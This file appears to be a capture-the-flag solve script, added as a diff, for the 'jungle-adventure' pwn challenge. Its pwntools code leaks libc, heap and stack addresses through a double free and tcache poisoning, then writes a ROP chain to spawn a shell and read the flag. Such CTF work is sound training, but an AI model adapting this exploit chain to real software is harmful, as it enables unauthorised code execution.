@@ -1,0 +1,151 @@
+#!/usr/bin/env python3
+from pwn import *
+
+binary = args.BIN or '../../publish/Pwn/jungle-adventure/jungle.bin'
+
+context.terminal = ["tmux", "splitw", "-h"]
+e = context.binary = ELF(binary)
+
+if args.REMOTE:
+   libc = ELF('../../publish/Pwn/jungle-adventure/libc.so.6', checksec=False)
+else:
+   libc = e.libc
+
+gs = '''
+break *$rebase(0x1c61)
+continue
+'''
+
+
+if args.REMOTE:
+    TIMEOUT = 0.5
+else:
+    TIMEOUT = 0.1
+
+def get_remote():
+    if args.GDB:
+        # return gdb.debug(e.path, gdbscript=gs)
+        return e.debug(gdbscript=gs)
+    elif args.REMOTE:
+        HOST = args.HOST or "2024.sunshinectf.games"
+        PORT = int(args.PORT or 24005)
+        return remote(HOST, PORT)
+    else:
+        return process(e.path)
+
+def start():
+    p = get_remote()
+    s = p.recvn(10, timeout=TIMEOUT)
+    if s != b'Password: ':
+        p.unrecv(s)
+        return p
+    p.sendline(b'block the haters')
+    return p
+
+
+def use_supplies(idx):
+    p.recvuntil(b'Enter your choice >>> ')
+    p.sendline(b'1')
+    p.sendline(f'{idx}'.encode())
+    p.recvuntil(b':')
+    data = p.recvline()
+    return data
+
+def add_supplies(idx,data):
+    p.recvuntil(b'Enter your choice >>> ')
+    p.sendline(b'2')
+    p.sendline(f'{idx}'.encode())
+    p.sendline(data)
+
+def del_supplies(idx):
+    p.recvuntil(b'Enter your choice >>> ')
+    p.sendline(b'3')
+    p.sendline(f'{idx}'.encode())
+
+def double_del_supplies(idx):
+    del_supplies(idx)
+    del_supplies(idx)
+
+def leak_libc():
+    log.info('Leaking libc base by wishing on a genie')
+    add_supplies(1,b'Genie')
+    data=use_supplies(1)
+    p.recvuntil(b'starting point:')
+    libc_leak = int(p.recvline().strip(b'\n'),16)
+    libc.address = libc_leak - libc.sym.printf
+    log.info(f'\tLibc Leak: {hex(libc_leak)}')
+    log.info(f'\tLibc Base: {hex(libc.address)}')
+
+def leak_heap_mask():
+    log.info('Leaking heap mask from last item in tcache')
+    double_del_supplies(5)
+    data=use_supplies(5).lstrip(b' ').rstrip(b'\n')
+    heap_mask = u64(data.ljust(8, b'\x00'))
+    log.info(f'\tHeap Mask: {hex(heap_mask)}')    
+    return heap_mask
+
+def leak_stack_through_tcache_ptr(heap_mask):
+    log.info('Leaking stack address by rewriting tcache fd to libc.sym.environ')
+    environ_symbol = libc.sym['environ']-24
+    log.info(f'\tLibc.sym.environ-24: {hex(environ_symbol)}')
+    addr = environ_symbol ^ heap_mask
+    for i in range(4,1,-1):
+        del_supplies(i)
+    double_del_supplies(1) 
+    add_supplies(1,p64(addr))
+    add_supplies(2,b'X'*24)
+    add_supplies(3,b'Y'*23)
+    use_supplies(3)
+    p.recvuntil(b'<<< The ')
+    p.recvline()
+    data = p.recvline().split(b' isn')[0]
+    stack = u64(data.ljust(8, b'\x00'))
+    log.info(f'\tStack Leak: {hex(stack)}')
+    return stack    
+
+def write_rop_chain_to_stack(heap_mask,stack_leak):
+    log.info('Writing ROP Chain by rewriting tcache fd to stack address')
+
+    del_supplies(6)
+    double_del_supplies(2)
+    
+    stack_target = stack_leak - 312 
+    while (stack_target & 0xf !=0):
+       stack_target = stack_target - 8
+
+    log.info(f'\tWriting chain to {hex(stack_target)}')
+    log.info(f'\tVerify alignment (stack target & 0xf) = {stack_target & 0xf}')
+    addr = stack_target ^ heap_mask
+    
+    rl = ROP(libc)
+    chain = p64(rl.find_gadget(['ret'])[0])*2
+    chain += p64(rl.find_gadget(['pop rdi','ret'])[0])
+    chain += p64(next(libc.search(b'/bin/sh')))
+    chain += p64(libc.sym['system'])
+    
+    add_supplies(2,p64(addr))
+    add_supplies(4,b'F'*23)
+    add_supplies(6,chain)
+    
+def trigger_ROP_with_gameover():
+    log.info('Ending game and triggering ROP Chain')
+    use_supplies(1)
+    use_supplies(1)
+    use_supplies(1)
+    use_supplies(1)
+    use_supplies(1)
+
+p = start()
+
+
+leak_libc()
+heap_mask = leak_heap_mask()
+stack_leak = leak_stack_through_tcache_ptr(heap_mask)
+write_rop_chain_to_stack(heap_mask, stack_leak)
+trigger_ROP_with_gameover()
+
+
+pause(1)
+p.sendline(b'cat flag.txt')
+
+p.interactive()
